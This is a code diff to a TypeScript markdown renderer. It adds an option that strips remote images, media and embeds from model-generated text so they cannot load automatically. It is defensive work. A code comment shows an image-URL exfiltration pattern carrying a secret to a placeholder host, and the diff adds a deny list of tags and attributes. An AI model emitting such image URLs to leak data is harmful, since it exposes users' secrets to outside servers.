@@ -75,9 +75,50 @@ DOMPurify.addHook('afterSanitizeAttributes', (node) => {
   }
 })
 
-export function renderMarkdown(text: string): string {
+export function renderMarkdown(text: string, opts: { remoteImages?: boolean } = {}): string {
   const html = md.parse(text, { async: false }) as string
-  return DOMPurify.sanitize(html, { ADD_ATTR: ['target', 'data-src', 'data-closed'], FORBID_TAGS: ['style', 'form', 'input'] })
+  if (opts.remoteImages !== false) return DOMPurify.sanitize(html, { ADD_ATTR: ['target', 'data-src', 'data-closed'], FORBID_TAGS: ['style', 'form', 'input'] })
+  // The text of a model: a remote image would load at once and could carry data out in its
+  // URL (`![](https://x/?d=SECRET)`). Sanitized into an inert fragment, nothing loads yet.
+  const frag = DOMPurify.sanitize(html, {
+    ADD_ATTR: ['target', 'data-src', 'data-closed'],
+    FORBID_TAGS: ['style', 'form', 'input', 'video', 'audio', 'source', 'track', 'picture', 'image', 'object', 'embed', 'iframe'],
+    FORBID_ATTR: ['style', 'srcset', 'poster', 'background'],
+    RETURN_DOM_FRAGMENT: true,
+  })
+  for (const el of frag.querySelectorAll('*')) {
+    for (const name of ['src', 'href', 'xlink:href', 'data', 'action', 'formaction']) {
+      const v = el.getAttribute(name)
+      if (v === null || !remoteURL.test(v.trim()) || (el.tagName === 'A' && name === 'href')) continue
+      if (el.tagName === 'IMG' && name === 'src') {
+        el.replaceWith(remoteImageLink(v.trim(), el.getAttribute('alt') ?? ''))
+        break
+      }
+      el.removeAttribute(name)
+    }
+  }
+  const box = document.createElement('template')
+  box.content.append(frag)
+  return box.innerHTML
+}
+
+// A URL out of the page: a scheme or `//`, but data: and blob: (already in the page).
+const remoteURL = /^(?!(data|blob):)([a-z][a-z0-9+.-]*:|\/\/)/i
+
+/** A link in place of a remote image: it opens in a new tab on a click, never loads in the page. */
+function remoteImageLink(src: string, alt: string): HTMLAnchorElement {
+  const a = document.createElement('a')
+  a.className = 'md-remote-img'
+  a.target = '_blank'
+  a.rel = 'noopener noreferrer'
+  let host = src
+  try {
+    host = new URL(src, location.href).host
+  } catch {}
+  a.href = src
+  a.title = src
+  a.textContent = `🖼 ${alt || host}`
+  return a
 }
 
 /**
